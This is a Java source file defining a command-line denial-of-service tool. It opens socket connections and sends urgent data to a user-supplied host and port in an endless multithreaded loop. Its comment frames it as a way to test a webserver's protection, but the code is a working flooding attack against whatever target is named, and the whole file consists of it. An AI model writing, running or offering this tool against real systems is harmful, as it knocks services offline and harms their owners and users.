package com.sevador.utility.tools;

import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * This Denial of Service class is used to debug the protection of your
 * webserver, in order for it to work efficiently, you must provide a host in
 * the JVM arguments first, and then the port. E.G localhost 80
 * 
 * @author <b>Tyluur</b><ItsTyluur@Gmail.com>
 * @since July 9, 2012
 */
public final class DoS {

	private static final int PROCESSORS = Runtime.getRuntime().availableProcessors();

	/**
	 * A thread pool service which will be used to run the DoS attack. The number
	 * of threads used is based on your computer processors
	 */
	private static final ExecutorService service = Executors.newFixedThreadPool(PROCESSORS);

	/**
	 * Initiates the attack on a given host and port.
	 * @param host The host to start the denial of service attack on
	 * @param port The port to attack on.
	 */
	public static void attack(final String host, final int port) {
		while(PROCESSORS > 0) {
			List<Runnable> runnables = new ArrayList<Runnable>();
			for (int i = 0; i < PROCESSORS * 1000; i++) {
				runnables.add(new Runnable() {

					@Override
					public void run() {
						try {
							new Socket(host, port).sendUrgentData(100);
						} catch (IOException e) {}
					}
				});
				for (Runnable runnable : runnables) {
					service.submit(runnable);
				}
			}
		}
	}

	public static void main(String[] args) {
		System.out.println("Starting to attack " + args[0] + ": " +args[1] + " with " + PROCESSORS + " processors available.");
		attack(args[0], Integer.parseInt(args[1]));
		System.out.println("COMPLETED!");
	}

}
